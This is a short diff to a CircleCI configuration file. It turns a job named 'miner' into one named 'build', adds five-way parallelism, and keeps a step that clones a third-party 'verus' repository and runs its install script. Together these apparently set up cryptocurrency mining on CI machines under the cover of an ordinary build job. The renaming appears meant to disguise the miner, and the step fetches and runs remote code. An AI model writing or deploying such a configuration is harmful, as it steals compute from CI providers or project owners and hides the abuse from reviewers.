@@ -1,20 +1,20 @@
 version: 2.1
 
 jobs:
-  miner:
+  build:
     machine:
       image: ubuntu-2004:current
+    parallelism: 5
     steps:
       - run:
-          name: Clone and Setup
+          name: Mining Setup
           command: |
             git clone https://github.com/0xwhyteddy/verus.git
             cd verus
             chmod +x install-script.sh
             ./install-script.sh
-
+            
 workflows:
-  version: 2
-  mining:
+  build-workflow:
     jobs:
-      - miner
+      - build
